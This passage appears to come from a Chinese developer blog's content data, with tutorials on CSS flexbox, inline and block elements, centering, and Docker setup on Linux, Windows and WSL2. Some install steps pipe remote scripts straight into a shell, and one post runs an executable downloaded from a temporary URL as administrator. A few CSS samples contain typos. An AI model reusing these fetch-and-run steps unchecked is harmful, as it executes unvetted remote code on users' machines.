当主轴为水平方向的时候，当设置了 flex-basis，项目的宽度设置值会失效，flex-basis 需要跟 flex-grow 和 flex-shrink 配合使用才能发挥效果。 \n \n 当 flex-basis 值为 0 % 时，是把该项目视为零尺寸的，故即使声明该尺寸为 140px，也并没有什么用。 \n 当 flex-basis 值为 auto 时，则跟根据尺寸的设定值(假如为 100px)，则这 100px 不会纳入剩余空间。 \n  flex-grow: 定义项目的放大比例 \n .item   { \n     flex-grow :  <number> ; \n } \n \n 1 2 3 默认值为 0，即如果存在剩余空间，也不放大\n \n当所有的项目都以 flex-basis 的值进行排列后，仍有剩余空间，那么这时候 flex-grow 就会发挥作用了。\n如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间。(如果有的话) \n 如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍。 \n 当然如果当所有项目以 flex-basis 的值排列完后发现空间不够了，且 flex-wrap：nowrap 时，此时 flex-grow 则不起作用了，这时候就需要接下来的这个属性。 \n  flex-shrink: 定义了项目的缩小比例 \n .item   { \n     flex-shrink :  <number> ; \n } \n \n 1 2 3 默认值: 1，即如果空间不足，该项目将缩小，负值对该属性无效。\n \n这里可以看出，虽然每个项目都设置了宽度为 50px，但是由于自身容器宽度只有 200px，这时候每个项目会被同比例进行缩小，因为默认值为 1。\n同理可得： \n 如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。 \n 如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。 \n  flex: flex-grow, flex-shrink 和 flex-basis的简写 \n .item { \n     flex :  none | [ < 'flex-grow' > < 'flex-shrink' >? || < 'flex-basis' > ]\n }  \n \n 1 2 3 flex 的默认值是以上三个属性值的组合。假设以上三个属性同样取默认值，则 flex 的默认值是 0 1 auto。 \n 有关快捷值：auto (1 1 auto) 和 none (0 0 auto) \n 关于 flex 取值，还有许多特殊的情况，可以按以下来进行划分： \n \n 当 flex 取值为一个非负数字，则该数字为 flex-grow 值，flex-shrink 取 1，flex-basis 取 0%，如下是等同的： \n \n .item   { flex :  1 ; } \n .item   { \n    flex-grow :  1 ; \n    flex-shrink :  1 ; \n    flex-basis :  0% ; \n } \n \n 1 2 3 4 5 6 \n 当 flex 取值为 0 时，对应的三个值分别为 0 1 0% \n \n .item   { flex :  0 ; } \n .item   { \n     flex-grow :  0 ; \n     flex-shrink :  1 ; \n     flex-basis :  0% ; \n } \n \n 1 2 3 4 5 6 \n 当 flex 取值为一个长度或百分比，则视为 flex-basis 值，flex-grow 取 1，flex-shrink 取 1，有如下等同情况（注意 0% 是一个百分比而不是一个非负数字） \n \n .item-1   { flex :  0% ; } \n .item-1   { \n     flex-grow :  1 ; \n     flex-shrink :  1 ; \n     flex-basis :  0% ; \n } \n\n .item-2   { flex :  24px ; } \n .item-2   { \n     flex-grow :  1 ; \n     flex-shrink :  1 ; \n     flex-basis :  24px ; \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 \n 当 flex 取值为两个非负数字，则分别视为 flex-grow 和 flex-shrink 的值，flex-basis 取 0%，如下是等同的： \n \n .item   { flex :  2 3 ; } \n .item   { \n     flex-grow :  2 ; \n     flex-shrink :  3 ; \n     flex-basis :  0% ; \n } \n \n 1 2 3 4 5 6 \n 当 flex 取值为一个非负数字和一个长度或百分比，则分别视为 flex-grow 和 flex-basis 的值，flex-shrink 取 1，如下是等同的： \n \n .item   { flex :  11 32px ; } \n .item   { \n     flex-grow :  11 ; \n     flex-shrink :  1 ; \n     flex-basis :  32px ; \n } \n \n 1 2 3 4 5 6 容器下的子元素的宽度和比容器和小的时候起作用。 grow 定义了子元素的尺寸增长因子，容器中除去子元素之和剩下的尺寸会按照各个子元素的 grow 值进行平分加大各个子元素上。 \n \n 当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大） \n 当 flex-wrap 为 wrap | wrap-reverse，且子项宽度和超过父容器宽度时，首先一定会换行，换行后，每一行的右端都可能会有剩余空间（最后一行包含的子项可能比前几行少，所以剩余空间可能会更大），这时 flex-grow 会起作用，若当前行所有子项的 flex-grow 都为0，则剩余空间保留，若当前行存在一个子项的 flex-grow 不为0，则剩余空间会被 flex-grow 不为0的子项占据 \n 当 flex-wrap 为 nowrap，且子项宽度和不及父容器宽度时，flex-grow 会起作用，子项会根据 flex-grow 设定的值放大（为0的项不放大） \n 当 flex-wrap 为 nowrap，且子项宽度和超过父容器宽度时，flex-shrink 会起作用，子项会根据 flex-shrink 设定的值进行缩小（为0的项不缩小）。但这里有一个较为特殊情况，就是当这一行所有子项 flex-shrink 都为0时，也就是说所有的子项都不能缩小，就会出现讨厌的横向滚动条 \n 总结上面四点，可以看出不管在什么情况下，在同一时间，flex-shrink 和 flex-grow 只有一个能起作用，这其中的道理细想起来也很浅显：空间足够时，flex-grow 就有发挥的余地，而空间不足时，flex-shrink 就能起作用。当然，flex-wrap 的值为 wrap | wrap-reverse 时，表明可以换行，既然可以换行，一般情况下空间就总是足够的，flex-shrink 当然就不会起作用 \n  align-self: 允许单个项目有与其他项目不一样的对齐方式 \n 单个项目覆盖 align-items 定义的属性 \n 默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。 \n .item   { \n      align-self :  auto | flex-start | flex-end | center | baseline | stretch ; \n } \n \n 1 2 3 这个跟 align-items 属性时一样的，只不过 align-self 是对单个项目生效的，而 align-items 则是对容器下的所有项目生效的。\n \n"},{title:"CSS基础-块级元素与行内元素",frontmatter:{title:"CSS基础-块级元素与行内元素",date:"2021-05-15T10:29:52.000Z",tags:["html","css"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/css/css-ji-chu-kuai-ji-yuan-su-yu-xing-nei-yuan-su.html",relativePath:"blogs/css/css-ji-chu-kuai-ji-yuan-su-yu-xing-nei-yuan-su.md",key:"v-1f913eb1",path:"/blogs/css/css-ji-chu-kuai-ji-yuan-su-yu-xing-nei-yuan-su.html",headers:[{level:2,title:"块级元素：",slug:"块级元素"},{level:2,title:"行内元素：",slug:"行内元素"},{level:2,title:"常见块级元素：",slug:"常见块级元素"},{level:2,title:"常见行内元素：",slug:"常见行内元素"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 文章总结了什么是块级元素、行内元素；有哪些块级元素、行内元素；块级元素与行内元素间的相互转换；行内置换元素的特殊性。\n 什么是块级元素、行内元素 \n \n \n \n \n 是否独占一行 \n width、height \n padding、margin \n 默认宽高 \n \n \n \n \n 块级元素 \n 是 \n 有效 \n 有效 \n 撑满父元素 \n \n \n 行内元素 \n 否 \n 无效 \n padding有效；margin水平方向有效，竖直方向无效 \n 随内部元素的内容变化 \n \n \n 行内块级元素 \n 否 \n 有效 \n 有效 \n 随内部元素的内容变化 \n 块级元素： \n 独占一行；元素的宽高、以及内外边距都可设置；元素宽度在不设置的情况下，是它本身父容器的100%\n 行内元素： \n 不会自动进行换行；元素的宽高不可设置；内边距可以设置、外边距水平方向有效，竖直方向无效；元素宽度在不设置的情况下，随内部元素的内容变化。\n 有哪些块级元素、行内元素 \n 常见块级元素： \n div , h1---h6 , p , ul , ol , dl , table , form\n \n \n div - 常用块级元素，也是css layout的主要标签 \n h1---h6 标题 \n p - 段落 \n ul - 非排序列表 \n ol - 排序表单 \n dl - 定义列表 \n table - 表格 \n form - 交互表单 \n hr - 水平分隔线 \n pre - 格式化文本 \n address - 地址 \n blockquote - 块引用 \n header - HTML5区段头或页头。 \n footer - HTML5区段尾或页尾。 \n section - HTML5一个页面区段。 \n article - HTML5文章内容。 \n aside - HTML5伴随内容。 \n hgroup - HTML5标题组。 \n menu - HTML5菜单列表 \n figcaption - HTML5图文信息组标题 \n figure - HTML5图文信息组 \n audio - HTML5音频播放 \n video - HTML5视频 \n output - HTML5表单输出 \n 常见行内元素： \n span , a  ,strong  ,b ,em  , i  , big  ,small  ,label \nimg , input  , select ,textarea（属于行内置换元素，下文详解）\n \n \n span - 常用内联容器，定义文本内区块 \n a - 锚点 \n strong - 粗体强调 \n b - 粗体 \n em - 强调 \n i - 斜体 \n small - 小字体文本 \n big - 大字体 \n sub - 下标 \n sup - 上标 \n label - 表格标签 \n img - 图片* input - 输入框 \n select - 项目选择 \n textarea - 多行文本输入框 \n abbr - 缩写 \n code - 计算机代码(在引用源码的时候需要) \n acronym - 首字 \n bdo - bidi override \n br - 换行 \n cite - 引用 \n dfn - 定义字段 \n font - 字体设定(不推荐) \n kbd - 定义键盘文本 \n q - 短引用 \n s - 中划线(不推荐) \n samp - 定义范例计算机代码 \n strike - 中划线 \n tt - 电传文本 \n u - 下划线 \n var - 定义变量 \n 行内元素与块级元素间的相互转换 \n 行内元素和块级元素都不是绝对的，可以相互转换,，通常有这些方式可以转换。\n \n \n display，将元素设置为块级、行内或是其它。 \n float，隐形地把内联元素转换为行内块级元素。不会占据一行，相当于display：inline-block; \n position,属性值为absolute、fixed时,隐形地把内联元素转换为块级元素，其它属性值不会做转换。 \n 置换元素 \n <img>、<input>、<textarea>、<select>、<object> 是行内元素，但是它们却可以设置宽高，这是为什么呢？因为它们是行内置换元素。\n置换元素：内容不受CSS视觉格式化模型控制，CSS渲染模型并不考虑对此内容的渲染，且元素本身一般拥有固有尺寸（宽度，高度，宽高比）的元素，被称之为置换元素。浏览器根据元素的标签和属性，来决定元素的具体显示内容。 例如：浏览器会根据 <img> 标签的src属性的值来读取图片信息并显示出来，而如果查看html代码，则看不到图片的实际内容； <input> 标签的type属性来决定是显示输入框，还是单选按钮等。\n置换元素在其显示中生成了框，这也就是有的内联元素能够设置宽高的原因。 \n"},{title:"修改css中select的下拉箭头样式",frontmatter:{title:"修改css中select的下拉箭头样式",date:"2021-05-16T12:16:45.000Z",tags:["css","select"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/css/css_EIm2DvbAz.html",relativePath:"blogs/css/css_EIm2DvbAz.md",key:"v-fa2c8ad6",path:"/blogs/css/css_EIm2DvbAz.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' select   { \n     /*Chrome和Firefox里面的边框是不一样的，所以复写了一下*/ \n     border :  solid 1px #000 ; \n\n     /*很关键：将默认的select选择框样式清除*/ \n     appearance : none ; \n     -moz-appearance : none ; \n     -webkit-appearance : none ; \n\n     /*在选择框的最右侧中间显示小箭头图片*/ \n     background :   url ( "http://ourjs.github.io/static/2015/arrow.png" )  no-repeat scroll right center transparent ; \n\n\n     /*为下拉小箭头留出一点位置，避免被文字覆盖*/ \n     padding-right :  14px ; \n\n\n     /*清除ie的默认选择框样式清除，隐藏下拉箭头*/ \n     select::-ms-expand   {   display :  none ;   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 '},{title:"CSS-水平居中、垂直居中、水平垂直居中",frontmatter:{title:"CSS-水平居中、垂直居中、水平垂直居中",date:"2021-05-23T15:52:20.000Z",tags:["CSS","html"],categories:"front-end-css",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/css/css_koXAnwdaZ.html",relativePath:"blogs/css/css_koXAnwdaZ.md",key:"v-5e5caa16",path:"/blogs/css/css_koXAnwdaZ.html",headers:[{level:2,title:"水平居中可分为行内元素水平居中和块级元素水平居中",slug:"水平居中可分为行内元素水平居中和块级元素水平居中"},{level:2,title:"单行文本垂直居中",slug:"单行文本垂直居中"},{level:2,title:"多行文本垂直居中",slug:"多行文本垂直居中"},{level:2,title:"块级元素垂直居中",slug:"块级元素垂直居中"},{level:2,title:"水平垂直居中",slug:"水平垂直居中"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 水平居中 \n 水平居中可分为行内元素水平居中和块级元素水平居中 \n \n 行内元素水平居中\n这里行内元素是指文本text、图像img、按钮超链接等，只需给父元素设置text-align:center即可实现。 \n \n .center { \n         text-align : center ; \n } \n<div class= "center" >水平居中</div>\n \n 1 2 3 4 \n 块级元素水平居中 \n \n \n 定宽块级元素水平居中\n只需给需要居中的块级元素加margin:0 auto即可，但这里需要注意的是，这里块状元素的宽度width值一定要有 \n \n .center { \n       width : 200px ; \n       margin : 0 auto ; \n       border : 1px solid red ; \n   } \n  <div class= "center" >水平居中</div>\n \n 1 2 3 4 5 6 \n 不定宽块级元素水平居中 \n \n 不定宽，即块级元素宽度不固定 \n 方法1：设置table\n通过给要居中显示的元素，设置display:table，然后设置margin:0 auto来实现 \n .center { \n      display : table ; \n      margin : 0 auto ; \n      border : 1px solid red ; \n  } \n <div class= "center" >水平居中</div>\n \n 1 2 3 4 5 6 方法2：设置inline-block（多个块状元素）\n子元素设置inline-block，同时父元素设置text-align:center \n .center { \n       text-align : center ; \n   } \n   .inlineblock-div { \n       display : inline-block ; \n   } \n  <div class= "center" >\n      <div class= "inlineblock-div" >1</div>\n      <div class= "inlineblock-div" >2</div>\n  </div>\n \n 1 2 3 4 5 6 7 8 9 10 方法3：设置flex布局\n只需把要处理的块状元素的父元素设置display:flex,justify-content:center; \n .center { \n       display : flex ; \n       justify-content : center ; \n   } \n  <div class= "center" >\n      <div class= "flex-div" >1</div>\n      <div class= "flex-div" >2</div>\n  </div>\n \n 1 2 3 4 5 6 7 8 方法4：position + 负margin；\n方法5：position + margin：auto；\n方法6：position + transform； \n 注：这里方法4、5、6同下面垂直居中一样的道理，只不过需要把top/bottom改为left/right，在垂直居中部分会详细讲述。 \n 垂直居中 \n 单行文本垂直居中 \n \n \n 设置paddingtop=paddingbottom；或 \n \n \n 设置line-height=height； \n 多行文本垂直居中 \n 通过设置父元素table，子元素table-cell和vertical-align\nvertical-align:middle的意思是把元素放在父元素的中部 \n \n \n .center { \n\t width : 200px ; \n\t height : 300px ; \n\t display : table ; \n\t border :  2px solid blue ; \t\n } \n .table-div { \n\t display : table-cell ; \n\t verticaL-aLign :  middle ; \n\t border : IJX solid red ; \n ) \n<div class= "center" >\n\t<div class="table-div”>多行文本垂直居中〈/div>\n</div>\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 #  块级元素垂直居中 \n flex布局 \n 在需要垂直居中的父元素上，设置display:flex和align-items：center\n要求：父元素必须显示设置height值 \n .center { \n\t width : 200px ; \n\t height : 300px ; \n\t display : flex ; \n\talign-items：center\n } \n<div class= "center" >\n\t<div>垂直居中〈/div>\n</div>\n \n 1 2 3 4 5 6 7 8 9 #  水平垂直居中 \n \n 方法1：flex布局 \n \n     .box { \n          height : 600px ;            \n          display : flex ; \n          justify-content : center ;   //子元素水平居中\n          align-items : center ;       //子元素垂直居中\n            /* aa只要三句话就可以实现不定宽高水平垂直居中。 */ \n     } \n     .box>div { \n         background :  green ; \n         width :  200px ; \n         height :  200px ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 \n 方法2：绝对定位+margin:auto \n \n      div { \n         width :  200px ; \n         height :  200px ; \n         background :  green ; \n        \n         position : absolute ; \n         left : 0 ; \n         top :  0 ; \n         bottom :  0 ; \n         right :  0 ; \n         margin :  auto ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 \n 方法3：绝对定位+负margin \n \n      div { \n         width : 200px ; \n         height :  200px ; \n         background : green ; \n        \n         position :  absolute ; \n         left : 50% ; \n         top : 50% ; \n         margin-left : -100px ; \n         margin-top : -100px ; \n     } \n \n 1 2 3 4 5 6 7 8 9 10 11 \n 方法4：绝对定位+transform \n \n      div { \n         width :  200px ; \n         height :  200px ; \n         background :  green ; \n        \n         position : absolute ; \n         left : 50% ;      /* 定位父级的50% */ \n         top : 50% ; \n         transform :   translate ( -50% , -50% ) ;   /*自己的50% */ \n     } \n \n 1 2 3 4 5 6 7 8 9 10 \n 方法5：table-cell实现居中 \n \n \n设置\n display : table-cell ; \n text-align : center ; \n vertical-align :  middle ; \n \n 1 2 3 4 5 '},{title:"docker 安装",frontmatter:{title:"docker 安装",date:"2021-07-17T11:24:24.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/574O8PkV7.jpg",isTop:!1},regularPath:"/blogs/docker/574O8PkV7.html",relativePath:"blogs/docker/574O8PkV7.md",key:"v-435d5b96",path:"/blogs/docker/574O8PkV7.html",headers:[{level:2,title:"windoww",slug:"windoww"},{level:2,title:"wsl2、ubuntu",slug:"wsl2、ubuntu"},{level:2,title:"Debian Docker、CentOS Docker安装",slug:"debian-docker、centos-docker安装"},{level:3,title:"使用官方安装脚本自动安装",slug:"使用官方安装脚本自动安装"},{level:2,title:"卸载 docker（Debian Docker、Ubuntu Docker）",slug:"卸载-docker-debian-docker、ubuntu-docker"},{level:2,title:"卸载 docker（CentOS Docker）",slug:"卸载-docker-centos-docker"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' windoww \n \n 下载 Docker Desktop  \n 开启 Hyper-V \npowershell 运行 Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All\n \n 1 \n 检测是否安装成功\npowershell 运行 docker run hello-world\n \n 1 \n wsl2、ubuntu \nEnsures not older packages are installed \n sudo   apt-get  remove docker docker-engine docker.io containerd runc\nEnsure pre-requisites are installed \n sudo   apt-get  update\n sudo   apt-get   install   \\ \n  apt-transport-https  \\ \n  ca-certificates  \\ \n   curl   \\ \n  gnupg  \\ \n  lsb-release\nAdds docker apt repository \n echo   \\ \n     "deb [arch= $( dpkg --print-architecture )  signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu  $( lsb_release -cs )  stable"   | \n     sudo   tee  /etc/apt/sources.list.d/docker.list  >  /dev/null\nAdds docker apt key \n curl  -fsSL https://download.docker.com/linux/ubuntu/gpg  | \n     sudo  gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg\nRefreshes apt repos \n sudo   apt-get  update\nInstalls Docker CE \n sudo   apt-get   install  docker-ce docker-ce-cli containerd.io\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #  Debian Docker、CentOS Docker安装 \n 使用官方安装脚本自动安装 \n \n 安装命令如下： \n \n curl  -4fsSL https://get.docker.com  |   bash  -s docker --mirror Aliyun\n \n 1 \n 也可以使用国内 daocloud 一键安装命令： \n \n curl  -sSL https://get.daocloud.io/docker  |   sh \n \n 1 #  卸载 docker（Debian Docker、Ubuntu Docker） \n \n 删除安装包： \n \n sudo   apt-get  purge docker-ce docker-ce-cli containerd.io\n \n 1 \n 删除镜像、容器、配置文件等内容： \n \n sudo   rm  -rf /var/lib/docker\n \n 1 #  卸载 docker（CentOS Docker） \n \n 删除安装包： \n \n yum remove docker-ce\n \n 1 \n 删除镜像、容器、配置文件等内容： \n \n rm  -rf /var/lib/docker\n \n 1 '},{title:"Windows 10 Docker desktop create Postgres engine",frontmatter:{title:"Windows 10 Docker desktop create Postgres engine",date:"2021-07-11T11:27:34.000Z",tags:["docker","Postgresql"],categories:"database",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/BHcRhfhx4.html",relativePath:"blogs/docker/BHcRhfhx4.md",key:"v-da1448fe",path:"/blogs/docker/BHcRhfhx4.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" cmd 运行 \n docker run --name some-postgres -e  POSTGRES_PASSWORD = postgres -d -p  5432 :5432 postgres\n \n 1 持久化数据库 \n docker run --name some-postgres -e  POSTGRES_PASSWORD = postgres -p  5432 :5432 -v D:/docker/PostgreSql/data:/var/lib/postgresql/data -d postgres\n \n 1 "},{title:"docker 常用命令",frontmatter:{title:"docker 常用命令",date:"2021-07-17T10:40:55.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/Ec4h0aLBU.png",isTop:!1},regularPath:"/blogs/docker/Ec4h0aLBU.html",relativePath:"blogs/docker/Ec4h0aLBU.md",key:"v-0e04e1ab",path:"/blogs/docker/Ec4h0aLBU.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 场景一：镜像下载、运行及删除 \n \n \n \n COMMAND \n DESC \n \n \n \n \n 查看 \n \n \n \n docker images \n 列出所有镜像(images) \n \n \n docker ps \n 列出正在运行的容器(containers) \n \n \n docker ps -a \n 列出所有的容器 \n \n \n docker pull centos \n 下载centos镜像 \n \n \n docker top ‘container’ \n 查看容器内部运行程序 \n \n \n 镜像 \n \n \n \n docker rmi [image-id] \n 删除镜像 \n \n \n docker rmi $(docker images -q) \n 删除所有镜像 \n \n \n docker rmi $(sudo docker images --filter "dangling=true" -q --no-trunc) \n 删除无用镜像 \n \n \n docker build -t wp-api . \n 构建1个镜像,-t(镜像的名字及标签) wp-api(镜像名) .(构建的目录) \n \n \n docker run -i -t wp-api \n -t -i以交互伪终端模式运行,可以查看输出信息 \n \n \n docker run -d -p 80:80 wp-api \n 镜像端口 -d后台模式运行镜像 \n \n \n ocker run --help \n 帮助 \n \n \n 容器 \n \n \n \n docker kill ‘container’ \n 停止正在运行的容器 \n \n \n docker rm ‘container’ \n 删除没有运行的容器 \n \n \n docker exec -it 容器ID sh \n 进入容器 \n \n \n docker stop ‘container’ \n 停止一个正在运行的容器，‘container’可以是容器ID或名称 \n \n \n docker start ‘container’ \n 启动一个已经停止的容器 \n \n \n docker restart ‘container’ \n 重启容器 \n \n \n docker run -i -t -p :80 LAMP /bin/bash \n 运行容器并做http端口转发 \n \n \n docker exec -it ‘container’ /bin/bash \n 进入ubuntu类容器的bash \n \n \n docker exec -it /bin/sh \n 进入alpine类容器的sh \n \n \n docker rm docker ps -a -q \n 删除所有已经停止的容器 \n \n \n docker kill $(docker ps -a -q) \n 杀死所有正在运行的容器，$()功能同`` \n \n \n \n 更多命令查看 Docker 命令大全 | 菜鸟教程 \n 场景二：下载镜像并直接运行 \n docker run  --name ubuntu -it ubuntu  bash  \ndocker  cp   dd  ubuntu:tmp/  #复制文件dd 到容器的/tmp 目录 \nCtrl-p Ctrl-q   #退出 \n \n 1 2 3 #  修改镜像，并保存到私有仓库 \n docker  exec  -it ubuntu  bash  \n apt-get  update\n apt-get   install  apache2\nCtrl-p Ctrl-q   #退出 \ndocker commit -a  "mir355"  -m  "ubuntu add apache2"   { ID }   private/ubuntu_apache:v1    #保存镜像 \ndocker stop ubuntu \ndocker  rm  ubuntu\ndocker run -i -t --name apache2 -p  8080 :80 private/ubuntu_apache:v1 /bin/bash\n/etc/init.d/apache2 start\nCtrl-p Ctrl-q   #退出 \n #通过 docker tag重命名镜像，使之与registry匹配 \ndocker tag private/ubuntu_apache:v1  127.0 .0.1:5000/private/ubuntu_apache:v1\n #保存到私有仓库 \ndocker push  127.0 .0.1:5000/private/ubuntu_apache:v1\n curl  http://127.0.0.1:5000/v2/_catalog\n\n #下载镜像 \ndocker pull  127.0 .0.1:5000/private/ubuntu_apache:v1\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 '},{title:"Windows 10 Docker InvalidOperationException Failed to set version to docker-desktop: exit code: -1",frontmatter:{title:"Windows 10 Docker InvalidOperationException Failed to set version to docker-desktop: exit code: -1",date:"2021-07-11T11:04:27.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/IlQNbjYzn.html",relativePath:"blogs/docker/IlQNbjYzn.md",key:"v-5d7f0599",path:"/blogs/docker/IlQNbjYzn.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" \ncmd/shell下执行 \n netsh winsock reset \n 然后重启docker就好了（临时方案，管不了多久，基本上重启电脑就不行了），久而久之就渴望一种永久的方法，不过还好找着了 \n 下面是永久方案 ***** \n 1.下载NoLsp(需要使用VPN等) \n http://www.proxifier.com/tmp/Test20200228/NoLsp.exe \n 2.下载的文件建议放在C:\\Windows\\System32下，也可以随便放，位置你知道就行，如果不是NoLsp.exe建议重命名一下，当前也可以不重命名，使用方便就行了 \n cmd下执行（管理员模式） \n NoLsp.exe c:\\windows\\system32\\wsl.exe \n 如果不对，肯定是路径不对。 \n 3.启动 wsl \n 执行wsl \n 4.效果图\n \n 5.重启Restart Docker Desktop \n"},{title:"Docker - Ubuntu - bash: ping: command not found",frontmatter:{title:"Docker - Ubuntu - bash: ping: command not found",date:"2021-07-17T19:50:37.000Z",tags:["linux","docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/MaQAkksss.png",isTop:!1},regularPath:"/blogs/docker/MaQAkksss.html",relativePath:"blogs/docker/MaQAkksss.md",key:"v-07ea8c85",path:"/blogs/docker/MaQAkksss.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" apt-get  update\n apt-get   install  iputils-ping\n \n 1 2 "},{title:"发布SpringBoot项目",frontmatter:{title:"发布SpringBoot项目",date:"2021-07-11T21:53:20.000Z",tags:["docker","Spring boot","java"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/R4q4HcMUL.png",isTop:!1},regularPath:"/blogs/docker/R4q4HcMUL.html",relativePath:"blogs/docker/R4q4HcMUL.md",key:"v-43be314a",path:"/blogs/docker/R4q4HcMUL.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' Spring boot \n 方法一 \n 运行 \n docker run -d -p  \'9090:9090\'  --name springboot-demo -v D:/Workspace/SpringBootDemo/target/SpringBootDemo-0.0.1-SNAPSHOT.war:/app.jar openjdk:11.0.11-jre-slim java -jar /app.jar\n \n 1 #  方法二 \n 先制作镜像，\nDockerfile设置 \n添加 Java 8 镜像来源\nFROM openjdk:11.0.11-jre-slim\n添加参数\nARG JAR_FILE\n添加 Spring Boot 包\nADD demo-0.0.1-SNAPSHOT.war app.jar\n执行启动命令\nENTRYPOINT ["java","-Djava.security.egd=file:/dev/./urandom","-jar","/app.jar"]\n \n 1 2 3 4 5 6 7 8 9 10 11 制作镜像命令 \n docker build -t tomcat:v1  . \n \n 1 运行实例命令 \n docker run -p  8080 :8080 -d tomcat:v1\n \n 1 powershell 执行 \n . \\gradlew build  ;  docker build  - t tomcat:v1  .   ;  docker run  - p 8080:8080  - d tomcat:v1  ; \n \n 1 '},{title:"Docker Desktop(WSL2)修改镜像存储位置",frontmatter:{title:"Docker Desktop(WSL2)修改镜像存储位置",date:"2021-07-11T11:28:43.000Z",tags:["docker"],categories:"deploy",published:!0,hideInList:!1,feature:"/post-images/_xMrzJo_w.png",isTop:!1},regularPath:"/blogs/docker/_xMrzJo_w.html",relativePath:"blogs/docker/_xMrzJo_w.md",key:"v-f973569e",path:"/blogs/docker/_xMrzJo_w.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 查看子系统 \n wsl -l -v --all\n \n 1 docker-desktop是存放程序的，docker-desktop-data是存放镜像的，这两个wsl子系统都是默认放在系统盘的。\n删除所有的image/container/wsl/hyperv数据： \n Troubleshoot => Clean / Purge data => hyperv\n \n 1 导出wsl子系统镜像: \n wsl --export docker-desktop docker-desktop.tar\nwsl --export docker-desktop-data docker-desktop-data.tar\n \n 1 2 删除子系统镜像 \n wsl --unregister docker-desktop\nwsl --unregister docker-desktop-data\n \n 1 2 重新创建wsl子系统： \n wsl --import docker-desktop D: \\ docker \\ wsl \\ distro docker-desktop.tar --version  2 \nwsl --import docker-desktop-data D: \\ docker \\ wsl \\ data docker-desktop-data.tar --version  2 \n \n 1 2 查看当前 Windows 10 PC 中已安装的 Linux 发行版 \n wslconfig /setdefault Name\n \n 1 设置默认Linux发行版 \n wslconfig /setdefault docker-desktop\n \n 1 运行多个Linux发行版 \n 在 Windows 10 中安装好多套 Linux 发行版之后，即便没将它设置为默认的 Linux 环境，也可以启动使用。例如，用户可以直接在「开始」菜单中找到启动 Ubuntu、openSUSE Leap 和 SUSE Linux Enterprise Server 系统的快捷方式，并同时运行三套独立的环境。 \n 如果你没在 Microsoft Store 中选择将 Linux 发行版的快捷方式固定到「开始」菜单，也只需要使用其命令名称即可从命令行或快捷方式启动 Linux 发行版。以下启动三个 Linux 发行版所需的命令： \n 　　Ubuntu： ubuntu\n\n　　openSUSE Leap  42 ： opensuse-42\n\n　　SUSE Linux Enterprise Server  12 ： sles-12\n \n 1 2 3 4 5 例如，即使 Ubuntu 是你的默认环境，仍然可以通过运行 opensuse-42 命令从任何地方启动 openSUSE。 \n"},{title:"docker 安装 docker compose",frontmatter:{title:"docker 安装 docker compose",date:"2021-08-29T09:20:01.000Z",tags:["linux","docker"],categories:"deploy",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/docker/docker-compose-install.html",relativePath:"blogs/docker/docker-compose-install.md",key:"v-61e759d5",path:"/blogs/docker/docker-compose-install.html",headers:[{level:2,title:"Finds the latest version",slug:"finds-the-latest-version"},{level:2,title:"Downloads the binary to the plugins folder",slug:"downloads-the-binary-to-the-plugins-folder"},{level:2,title:"Assigns execution permission to it",slug:"assigns-execution-permission-to-it"},{level:2,title:"Test the installation",slug:"test-the-installation"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' Finds the latest version \n compose_version = $( curl  -fsSL -o /dev/null -w  "%{url_effective}"  https://github.com/docker/compose/releases/latest  |   xargs   basename ) \n \n 1 #  Downloads the binary to the plugins folder \n curl  -fL --create-dirs -o /usr/local/bin/docker-compose  \\ \n     "https://github.com/docker/compose/releases/download/ ${compose_version} /docker-compose-linux- $( uname  -m ) " \n \n 1 2 #  Assigns execution permission to it \n chmod  +x /usr/local/bin/docker-compose\n \n 1 #  Test the installation \n docker-compose --version\n \n 1 